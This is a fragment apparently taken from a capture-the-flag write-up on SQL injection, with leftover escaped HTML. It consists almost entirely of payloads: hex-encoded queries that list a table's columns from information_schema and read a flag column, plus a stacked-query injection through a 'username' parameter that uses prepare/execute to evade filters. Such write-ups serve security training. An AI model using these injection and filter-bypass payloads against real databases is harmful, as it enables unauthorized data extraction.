0x73656C6563742067726F75705F636F6E63617428636F6C756D6E5F6E616D65292066726F6D20696E666F726D6174696F6E5F736368656D612E636F6C756D6E73207768657265207461626C655F6E616D653D2763746673685F6F775F666C6167617327


select flagasb from ctfsh_ow_flagas
--&amp;gt;
0x73656C65637420666C61676173622066726F6D2063746673685F6F775F666C61676173
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?username=1&amp;#39;;prepare a from 0x73656c65637420646174616261736528293b;execute a;
&lt;/code&gt;&lt;/pre&gt;
